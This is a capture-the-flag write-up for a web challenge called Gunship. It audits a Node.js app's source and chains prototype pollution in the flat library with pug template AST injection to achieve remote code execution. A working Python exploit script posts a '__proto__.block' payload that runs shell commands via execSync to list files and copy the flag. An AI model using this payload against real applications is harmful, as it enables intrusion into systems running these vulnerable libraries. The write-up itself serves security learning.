# Gunship
![image](https://user-images.githubusercontent.com/44206101/147740721-833f0746-1e34-4cad-91c5-920fdb430a30.png)
## First look
What an eye-catching interface!
![image](https://user-images.githubusercontent.com/44206101/147741109-7b764efa-077a-49af-a035-3ca1ec4fa702.png)

Click on HERE, we are directed to [GUNSHIP](https://www.retro-synthwave.com/artists/gunship) - a GUNSHIP's website, so don't mind it!

The last thing we have to focus on is name input. Let's try to fill something here!
![image](https://user-images.githubusercontent.com/44206101/147744651-9ae91bed-e0a9-4eba-b512-6d49529c5674.png)

It wants the full name of an existing member. I chose Alex Westaway, it returned different response but it seems useless.
![image](https://user-images.githubusercontent.com/44206101/147744954-268e50fa-9645-4bb3-b239-662d5b412c42.png)

This is a `white box` challenge, so let's audit source code.

## Audit
*index.js*
```js
const path              = require('path');
const express           = require('express');
const pug        		= require('pug');
const { unflatten }     = require('flat');
const router            = express.Router();

router.get('/', (req, res) => {
    return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/submit', (req, res) => {
    const { artist } = unflatten(req.body);

	if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
		return res.json({
			'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
		});
	} else {
		return res.json({
			'response': 'Please provide us with the full name of an existing member.'
		});
	}
});

module.exports = router;
```

This NodeJS application use `flat` library to unflatten data and `pug` template engine to compile html code.
```js
const pug        		= require('pug');
const { unflatten }     = require('flat');
```

Check `package.json`, flat's version is `5.0.0` and pug's version is `3.0.0`
![image](https://user-images.githubusercontent.com/44206101/147748168-83c6695f-5234-4eb6-82f0-a7a973cbfc6e.png)

After searching for `flat 5.0.0` and `pug 3.0.0`, I knew that `flat 5.0.0` can result in Prototype Pollution and `pug 3.0.0` can result in RCE.

By the way, I found a blog [AST Injection, Prototype Pollution to RCE](https://blog.p6.is/AST-Injection/)

Now, let's kick the tires.

## Exploit
### Make pollution by python script
We use `ls > /app/static/pollution` to list all files in folder `app` and output at `app/static/pollution` because it's  readable easily. 
```python
import requests

TARGET_URL = 'http://138.68.149.48:30055/api/submit'

# make pollution
requests.post(TARGET_URL, json = {
    "artist.name":"Alex Westaway",
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync('ls > /app/static/pollution')"
    }
})
```

Curl:
![image](https://user-images.githubusercontent.com/44206101/147752576-06fc8e76-c366-4c36-9760-154914e462b7.png)

Maybe the real flag is `flagPULXq`. So let's copy it from folder `app` to `app/static/`

### Take the flag
Edit payload: `cp /app/flagPULXq /app/static/real_flag`

And curl it
![image](https://user-images.githubusercontent.com/44206101/147753420-c01cedd5-ddbb-4e8a-88ad-ab2f6ccd3773.png)

Got the flag and submit it!

Good luck!
